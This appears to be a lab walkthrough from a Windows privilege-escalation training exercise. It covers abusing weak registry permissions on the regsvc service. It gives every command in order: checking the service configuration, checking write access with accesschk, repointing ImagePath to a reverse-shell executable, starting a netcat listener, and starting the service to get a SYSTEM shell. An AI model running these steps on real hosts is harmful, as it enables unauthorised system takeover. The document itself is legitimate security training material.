# 🐾 Task 5: Exploiting Services - Weak Registry Permissions
---

## 📜 Task Description
In this task, we will exploit a registry vulnerability associated with the `regsvc` service, which runs with SYSTEM privileges. The vulnerability lies in the registry entry used to specify the executable path, which has weak permissions. This allows us to modify it to point to our executable file and gain a reverse shell with SYSTEM privileges.

---

## 🔍 Step 1: Checking Service Configuration
First, check the configuration of the `regsvc` service to confirm it runs with SYSTEM privileges and has a registry vulnerability. Execute the following command:  
`sc.exe qc regsvc`

### 📋 Expected Output
- Ensure that the `SERVICE_START_NAME` indicates SYSTEM.
- Verify that the executable path may be vulnerable to tampering.  
![image](https://github.com/user-attachments/assets/fcad07e5-5d73-42e5-95f8-92ca0adc6032)

---

## 🔑 Step 2: Checking Registry Write Permissions
Next, use the `accesschk.exe` tool to verify write permissions on the registry entry for the `regsvc` service. Execute the following command:  
`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

### 📋 Expected Output
- Confirm that the `NT AUTHORITY\INTERACTIVE` group (or all logged-in users) has write access to the registry key.  
![image](https://github.com/user-attachments/assets/0480858d-0e9e-479d-8b72-d23660aabb13)

---

## 📝 Step 3: Modifying the Registry Key
Now, modify the `ImagePath` registry key to point to your `reverse.exe` executable. Run the following command:  
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

### 📋 Expected Output
- Confirm that the `ImagePath` key has been successfully updated to point to `reverse.exe`.  
![image](https://github.com/user-attachments/assets/e29a79bb-671d-4ccc-8f7b-cfa2b56c31ee)

---

## 🎧 Step 4: Setting Up the Listener
Before starting the service, ensure you have a listener running on Kali. Use the following command to start the listener:  
`nc -lvnp 53`

---

## 🚀 Step 5: Starting the Service
Now, start the `regsvc` service. It should execute `reverse.exe` and provide you with a reverse shell with SYSTEM privileges. Execute the following command:  
`net start regsvc`

### 📋 Expected Output
- Confirm that you have received a reverse shell on Kali.  
![image](https://github.com/user-attachments/assets/fdccd94b-bdb7-4a7d-8370-9235cf78d6af)

---

## 🎉 Congratulations!
You have successfully exploited a registry vulnerability to gain a reverse shell with SYSTEM privileges! 🎊

---

## 📌 Notes
- Make sure you understand each step and its implications.
- Use this knowledge responsibly and only within authorized penetration testing engagements.
